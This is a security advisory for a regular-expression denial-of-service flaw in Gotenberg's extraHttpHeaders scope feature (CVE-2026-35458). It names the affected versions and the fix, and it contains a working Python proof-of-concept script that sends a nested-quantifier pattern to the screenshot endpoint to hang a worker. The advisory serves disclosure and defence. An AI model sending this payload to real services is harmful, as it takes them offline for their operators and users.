# [H] Gotenberg Vulnerable to ReDoS via extraHttpHeaders scope feature

## Summary
Severity: High
Advisory: GHSA-fmwg-qcqh-m992
CVE: CVE-2026-35458
CWE: CWE-1333
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-fmwg-qcqh-m992
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.30.0

## Details
### Summary
Gotenberg uses `dlclark/regexp2` to compile user-supplied scope patterns without setting a proper timeout. Users with access to features using this logic can hang workers indefinitely. 

### Details
Gotenberg uses `dlclark/regexp2` to compile user-supplied scope patterns (gotenberg/pkg/modules/chromium/routes.go:200) with no MatchTimeout set, therefore using the default of math.MaxInt64 = "forever".

For example, any user with access to the endpoint `/forms/chromium/screenshot/url` can add a crafted scope pattern to the `extraHttpHeaders` form field using a nested quantifiers that causes infinite backtracking, hanging the Gotenberg worker indefinitely.

See the [dlclark/regexp2 README.md](https://github.com/dlclark/regexp2?tab=readme-ov-file#catastrophic-backtracking-and-timeouts) for further considerations.

Tested on the latest container version gotenberg/gotenberg:8.29.1

### PoC

The following Python script uses the `/forms/chromium/screenshot/url` endpoint, testing for differences in responses times between simple and malicious regexes.

```python
#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = [
#    "requests",
# ]
# ///
import json
import time
import requests

HOST = "localhost:3000"
# HOST = "gotenberg.local:3000"

def send_request(host: str, headers_dict: dict, label: str, timeout: int = 30):
    """Send a screenshot request to Gotenberg and measure response time."""
    url = f"http://{host}/forms/chromium/screenshot/url"
    print(f"\n[*] {label}")
    print(f"    extraHttpHeaders: {json.dumps(headers_dict)}")

    start = time.time()
    try:
        r = requests.post(
            url,
            data={
                "url": "http://api.service:3000/snapshot/",
                "extraHttpHeaders": json.dumps(headers_dict),
            },
            files={"a": "b"},
            timeout=timeout,
        )
        elapsed = time.time() - start
        print(f"    Status: {r.status_code}, Size: {len(r.content)}, Time: {elapsed:.2f}s")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"    TIMEOUT after {elapsed:.2f}s — Gotenberg worker is hung (ReDoS confirmed)")
    except requests.exceptions.ConnectionError as e:
        elapsed = time.time() - start
        print(f"    CONNECTION ERROR after {elapsed:.2f}s: {e}")


def main():
    # --- Test 1: Baseline ---
    send_request(HOST, {"X-Test": "baseline"}, "Baseline: no scope")

    # --- Test 2: Simple scope ---
    send_request(HOST, {"X-Test": "value; scope=.*"}, "Simple scope: '.*'")

    # --- Test 3: ReDoS scope ---
    # Classic evil pattern: nested quantifiers on overlapping character class.
    evil_pattern = r"([a-zA-Z0-9.:/_]+)+\!"
    send_request(
        HOST,
        {"X-Test": f"value; scope={evil_pattern}"},
        f"ReDoS scope: '{evil_pattern}'",
        timeout=15,
    )


if __name__ == "__main__":
    main()
```

### Impact

This is a ReDoS vulnerability which only impacts the availability of the service and/or server on which gotenberg is running. All instances where attackers can reach the `/forms/chromium/screenshot/url` endpoint specifing the `extraHttpHeaders` field are affected.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-fmwg-qcqh-m992
- https://nvd.nist.gov/vuln/detail/CVE-2026-35458
- https://github.com/gotenberg/gotenberg/commit/cfb48d9af48cb236244eabe5c67fe1d30fb3fe25
- https://github.com/gotenberg/gotenberg
